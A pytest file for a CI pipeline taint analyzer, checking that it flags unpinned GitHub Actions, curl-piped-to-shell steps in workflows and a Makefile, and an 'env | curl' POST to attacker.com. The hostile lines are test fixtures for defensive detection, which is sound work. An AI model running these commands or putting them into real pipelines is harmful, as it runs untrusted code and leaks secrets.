"""
Tests for pipeline taint analysis.
"""

import pytest
from pathlib import Path

from vanguard.pipeline_analyzer import WorkflowTaintAnalyzer
from vanguard.exceptions import SuspiciousPipelineHook


def test_pipeline_analyzer_clean_workflow(tmp_project: Path) -> None:
    """Verify legitimate workflows pass without findings."""
    workflows_dir = tmp_project / ".github" / "workflows"
    workflows_dir.mkdir(parents=True)

    workflow_file = workflows_dir / "test.yml"
    workflow_file.write_text(
        """
name: Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.0
      - run: pip install -r requirements.txt
"""
    )

    analyzer = WorkflowTaintAnalyzer(tmp_project)
    analyzer.scan()

    assert len(analyzer.get_findings()) == 0


def test_pipeline_analyzer_unpinned_action(tmp_project: Path) -> None:
    """Detect unpinned GitHub Actions."""
    workflows_dir = tmp_project / ".github" / "workflows"
    workflows_dir.mkdir(parents=True)

    workflow_file = workflows_dir / "risky.yml"
    workflow_file.write_text(
        """
name: Risky
jobs:
  build:
    steps:
      - uses: actions/setup-python@main
"""
    )

    analyzer = WorkflowTaintAnalyzer(tmp_project)

    with pytest.raises(SuspiciousPipelineHook):
        analyzer.scan()

    assert len(analyzer.get_findings()) > 0


def test_pipeline_analyzer_rce_pattern(tmp_project: Path) -> None:
    """Detect remote code execution patterns."""
    workflows_dir = tmp_project / ".github" / "workflows"
    workflows_dir.mkdir(parents=True)

    workflow_file = workflows_dir / "rce.yml"
    workflow_file.write_text(
        """
name: RCE
jobs:
  build:
    steps:
      - run: curl https://example.com/script.sh | bash
"""
    )

    analyzer = WorkflowTaintAnalyzer(tmp_project)

    with pytest.raises(SuspiciousPipelineHook):
        analyzer.scan()

    assert len(analyzer.get_findings()) > 0


def test_pipeline_analyzer_env_exfil(tmp_project: Path) -> None:
    """Detect environment variable exfiltration."""
    workflows_dir = tmp_project / ".github" / "workflows"
    workflows_dir.mkdir(parents=True)

    workflow_file = workflows_dir / "exfil.yml"
    workflow_file.write_text(
        """
name: Exfil
jobs:
  build:
    steps:
      - run: env | curl -X POST http://attacker.com/exfil
"""
    )

    analyzer = WorkflowTaintAnalyzer(tmp_project)

    with pytest.raises(SuspiciousPipelineHook):
        analyzer.scan()

    assert len(analyzer.get_findings()) > 0


def test_pipeline_analyzer_makefile_rce(tmp_project: Path) -> None:
    """Detect RCE patterns in Makefiles."""
    makefile = tmp_project / "Makefile"
    makefile.write_text(
        """
all:
\tcurl https://example.com/init.sh | sh
"""
    )

    analyzer = WorkflowTaintAnalyzer(tmp_project)

    with pytest.raises(SuspiciousPipelineHook):
        analyzer.scan()

    assert len(analyzer.get_findings()) > 0


def test_pipeline_analyzer_no_workflows(tmp_project: Path) -> None:
    """Verify graceful handling when no workflows exist."""
    analyzer = WorkflowTaintAnalyzer(tmp_project)
    analyzer.scan()

    assert len(analyzer.get_findings()) == 0
